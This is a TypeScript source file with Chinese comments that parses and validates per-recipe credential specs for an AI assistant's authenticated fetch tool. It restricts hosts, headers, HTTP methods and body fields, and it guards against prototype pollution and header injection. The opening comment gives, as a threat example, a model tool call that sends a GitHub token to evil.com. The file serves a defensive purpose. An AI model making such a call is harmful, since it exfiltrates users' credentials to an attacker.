/**
 * 配方里的 `secrets` 声明 —— 纯数据，宿主据此决定往哪儿发凭据。
 * @module application/skill/SecretSpec
 *
 * 为什么单独一层：http_fetch_auth 是宿主单例原语，模型调用时只给
 * `url` + `secretKey`。`allowedHosts` / header 拼法 / 弹框文案**必须来自配方**，
 * 绝不能让模型当参数传 —— 否则 `http_fetch_auth(url='https://evil.com',
 * secretKey='github_token')` 就能把 token 发到任意站点。
 *
 * 规格由「已启用配方」汇总（见 collectSecretSpecs）：工具本身仍按技能命中才挂，
 * 但规格查表与命中无关，装配期一次建好，ChatUseCase / ToolLoop / kv_* 全不动。
 * 加一条需要认证的 API = 加一条配方声明，内核与工具签名一律不改。
 *
 * POST 场景（如 Tavily /search）：工具签名仍是 url + secretKey 两个参数，模型
 * 既不能指定 method、也不能传 body。配方声明 method: 'POST' 与
 * bodyQueryParams 白名单，宿主把 URL query 里白名单内的键搬进 JSON body，
 * 其余参数（search_depth / max_results 等）由配方写成固定值，模型改不了。
 */

/** 配方里一条凭据规格：全部是给宿主 / 弹框看的声明，不含可执行代码 */
export interface SecretSpec {
  /** secrets 域里的逻辑键，如 github_token；也是 secret-prompt: 链接的 key */
  key: string;
  /** 弹框里的输入框标签 */
  label: string;
  /** 用户去哪儿生成凭据（可选，弹框展示为纯文本，不自动打开） */
  setupUrl?: string;
  /** 弹框补充说明（可选） */
  hint?: string;
  /** 只允许把凭据发到这些 host；大小写不敏感，精确匹配 hostname */
  allowedHosts: string[];
  /** 宿主拼请求头：`<name>: <prefix><token>` */
  header: { name: string; prefix: string };
  /**
   * HTTP 方法，缺省 'GET'。只允许 GET / POST —— 其它方法一律在解析阶段拒绝，
   * 避免把带凭据的 DELETE / PUT 之类危险动作开放给配方。
   */
  method?: 'GET' | 'POST';
  /**
   * POST 专用：JSON body 的静态字段（配方声明的固定值，模型无法覆盖）。
   * 只允许 JSON 可序列化的标量 / 数组 / 普通对象，不含任何凭据；宿主会把它
   * 与 bodyQueryParams 映射出的 query 值合并后序列化。缺省 = 空对象。
   */
  bodyStatic?: Record<string, unknown>;
  /**
   * POST 专用：允许从 URL query 搬进 JSON body 的键白名单（如 ['q']）。
   * 模型给的 url 里只有这些键会进 body，其余 query 参数一律丢弃，防止模型
   * 借 query 夹带任意字段扩张请求形状。缺省 = 空数组（body 只含静态字段）。
   */
  bodyQueryParams?: string[];
  /**
   * 判定「凭据失效」的状态码，默认 [401]。
   * 401 是 RFC 7235 的 Unauthorized 语义，不是拟合出来的阈值；
   * 个别 API（如某些网关用 403/419）由配方显式声明。
   */
  reauthStatuses?: number[];
}

/** 主机名 / 请求头名的校验口径（与 URL / HTTP 规范同源，不另造规则） */
const KEY_RE = /^[a-z][a-z0-9_]*$/;
const HOST_RE = /^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$/i;
const HEADER_NAME_RE = /^[A-Za-z0-9!#$%&'*+.^_`|~-]+$/;
/** body 字段名：与 query 参数名同形，只允许标识符字符，避免奇怪键 */
const BODY_KEY_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;
/** 配方来自 JSON.parse，这三个是合法的标识符但绝不能当 body 字段名 */
const UNSAFE_BODY_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function isBodyKey(k: string): boolean {
  return BODY_KEY_RE.test(k) && !UNSAFE_BODY_KEYS.has(k);
}

function isRecord(v: unknown): v is Record<string, unknown> {
  return typeof v === 'object' && v !== null && !Array.isArray(v);
}

function str(v: unknown, label: string): string {
  if (typeof v !== 'string' || v.trim() === '') throw new Error(`${label} 必须是非空字符串`);
  return v;
}

/**
 * 解析并校验一条规格；任何一项不合规直接抛错（配方解析阶段就拒绝，
 * 绝不带着半份声明进运行时）。URL 值只在 setupUrl 里做展示，不做请求。
 */
export function parseSecretSpec(raw: unknown, index: number): SecretSpec {
  const where = `secrets 第 ${index + 1} 项`;
  if (!isRecord(raw)) throw new Error(`${where} 必须是对象`);

  const key = str(raw['key'], `${where} key`);
  if (!KEY_RE.test(key)) throw new Error(`${where} key 必须匹配 /^[a-z][a-z0-9_]*$/`);

  const label = str(raw['label'], `${where} label`);

  const hosts = raw['allowedHosts'];
  if (!Array.isArray(hosts) || hosts.length === 0) {
    throw new Error(`${where} allowedHosts 必须是至少 1 条的 host 数组`);
  }
  const allowedHosts: string[] = [];
  for (const h of hosts as unknown[]) {
    if (typeof h !== 'string' || !HOST_RE.test(h)) {
      throw new Error(`${where} allowedHosts 含非法 host：${String(h)}（只收纯域名，不带协议 / 端口 / 路径 / 通配）`);
    }
    const lower = h.toLowerCase();
    if (!allowedHosts.includes(lower)) allowedHosts.push(lower);
  }

  const headerRaw = raw['header'];
  if (!isRecord(headerRaw)) throw new Error(`${where} header 必须是对象`);
  const headerName = str(headerRaw['name'], `${where} header.name`);
  if (!HEADER_NAME_RE.test(headerName)) throw new Error(`${where} header.name 不是合法 HTTP 头名`);
  const prefixRaw = headerRaw['prefix'];
  if (typeof prefixRaw !== 'string') throw new Error(`${where} header.prefix 必须是字符串（可为空串）`);
  // prefix 只用来拼 header 值；禁止换行，避免头注入 / 拆出第二个头。
  if (/[\r\n]/.test(prefixRaw)) throw new Error(`${where} header.prefix 不允许换行`);
  const header = { name: headerName, prefix: prefixRaw };

  const optionalString = (k: string): string | undefined => {
    const v = raw[k];
    if (v === undefined) return undefined;
    return str(v, `${where} ${k}`);
  };
  const setupUrl = optionalString('setupUrl');
  const hint = optionalString('hint');

  // ---- 可选：POST 请求形状（全部来自配方，模型运行时无法指定） ----
  let method: 'GET' | 'POST' | undefined;
  const rawMethod = raw['method'];
  if (rawMethod !== undefined) {
    if (rawMethod !== 'GET' && rawMethod !== 'POST') {
      throw new Error(`${where} method 只允许 'GET' 或 'POST'`);
    }
    method = rawMethod;
  }

  let bodyStatic: Record<string, unknown> | undefined;
  const bs = raw['bodyStatic'];
  if (bs !== undefined) {
    if (!isRecord(bs)) throw new Error(`${where} bodyStatic 必须是对象`);
    for (const k of Object.keys(bs)) {
      if (!isBodyKey(k)) throw new Error(`${where} bodyStatic 含非法字段名：${k}`);
    }
    // 用 JSON 往返做「可序列化 + 不含函数 / undefined / 循环引用」的确定性校验，
    // 同时把值规范成纯 JSON 数据；这里不引入任何外部依赖。
    try {
      bodyStatic = JSON.parse(JSON.stringify(bs)) as Record<string, unknown>;
    } catch {
      throw new Error(`${where} bodyStatic 必须是可 JSON 序列化的对象`);
    }
    if (!isRecord(bodyStatic)) throw new Error(`${where} bodyStatic 必须是对象`);
  }

  let bodyQueryParams: string[] | undefined;
  const bqp = raw['bodyQueryParams'];
  if (bqp !== undefined) {
    if (!Array.isArray(bqp)) throw new Error(`${where} bodyQueryParams 必须是字符串数组`);
    const out: string[] = [];
    for (const p of bqp as unknown[]) {
      if (typeof p !== 'string' || !isBodyKey(p)) {
        throw new Error(`${where} bodyQueryParams 含非法字段名：${String(p)}`);
      }
      if (!out.includes(p)) out.push(p);
    }
    bodyQueryParams = out;
  }

  // POST 专属字段只在该方法下有意义；GET 里出现就是配方写错了，早拒绝别静默忽略。
  if (method !== 'POST' && (bodyStatic !== undefined || bodyQueryParams !== undefined)) {
    throw new Error(`${where} bodyStatic / bodyQueryParams 仅允许在 method='POST' 时声明`);
  }
  // POST 至少要有一种 body 来源，否则发出去的空 body 对搜索类接口毫无意义。
  if (method === 'POST' && bodyStatic === undefined && bodyQueryParams === undefined) {
    throw new Error(`${where} method='POST' 时必须声明 bodyStatic 或 bodyQueryParams`);
  }

  let reauthStatuses: number[] | undefined;
  const rs = raw['reauthStatuses'];
  if (rs !== undefined) {
    if (!Array.isArray(rs) || rs.length === 0) {
      throw new Error(`${where} reauthStatuses 必须是至少 1 条的整数数组`);
    }
    const out: number[] = [];
    for (const s of rs as unknown[]) {
      if (typeof s !== 'number' || !Number.isInteger(s) || s < 400 || s > 599) {
        throw new Error(`${where} reauthStatuses 含非法的 HTTP 状态码：${String(s)}`);
      }
      if (!out.includes(s)) out.push(s);
    }
    reauthStatuses = out;
  }

  return {
    key, label, ...(setupUrl !== undefined ? { setupUrl } : {}),
    ...(hint !== undefined ? { hint } : {}),
    allowedHosts, header,
    ...(method !== undefined ? { method } : {}),
    ...(bodyStatic !== undefined ? { bodyStatic } : {}),
    ...(bodyQueryParams !== undefined ? { bodyQueryParams } : {}),
    ...(reauthStatuses !== undefined ? { reauthStatuses } : {}),
  };
}

/** 解析整份 secrets 数组；缺省（字段没写）= 空数组，老配方逐字兼容 */
export function parseSecretSpecs(raw: unknown): SecretSpec[] {
  if (raw === undefined) return [];
  if (!Array.isArray(raw)) throw new Error('secrets 必须是数组');
  const out: SecretSpec[] = [];
  const seen = new Set<string>();
  for (let i = 0; i < (raw as unknown[]).length; i += 1) {
    const spec = parseSecretSpec((raw as unknown[])[i], i);
    if (seen.has(spec.key)) throw new Error(`secrets 第 ${i + 1} 项 key 重复：${spec.key}`);
    seen.add(spec.key);
    out.push(spec);
  }
  return out;
}

/** 汇总「已启用配方」的规格；同 key 多配方声明不一致时抛错，避免静默二义 */
export function collectSecretSpecs(recipes: readonly { secrets?: readonly SecretSpec[] }[]): SecretSpec[] {
  const byKey = new Map<string, SecretSpec>();
  for (const recipe of recipes) {
    for (const spec of recipe.secrets ?? []) {
      const existing = byKey.get(spec.key);
      if (!existing) { byKey.set(spec.key, spec); continue; }
      if (JSON.stringify(existing) !== JSON.stringify(spec)) {
        throw new Error(`凭据 ${spec.key} 在多条配方里声明不一致`);
      }
    }
  }
  return [...byKey.values()];
}
